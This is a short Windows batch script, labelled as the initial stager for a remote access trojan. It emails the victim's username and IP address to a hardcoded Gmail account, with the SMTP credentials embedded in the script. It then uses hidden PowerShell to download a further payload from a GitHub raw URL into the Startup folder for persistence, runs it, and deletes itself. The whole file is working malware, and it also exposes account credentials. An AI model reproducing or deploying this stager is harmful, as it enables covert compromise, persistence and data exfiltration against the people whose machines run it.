@echo off
@REM initial stager for RAT
@REM created by: Petros


@REM setup smtp
powershell $email = "websitepetros@gmail.com"; $password = "Peter1234!@#$"; $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "PetrosRAT: $env:UserName ip"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredentials($email, $password); $smtp.Send($email, $email, $subject, $ip);


@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into the startup folder
cd "%STARTUP%"



@REM write payloads to startup
powershell powershell.exe -windowstyle hidden  "Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/wget.cmd -OutFile wget.cmd"


@REM run payload  
powershell ./wget.cmd

@REM cd back to the initial directory
cd "%INITIALPATH%"
del initial.cmd
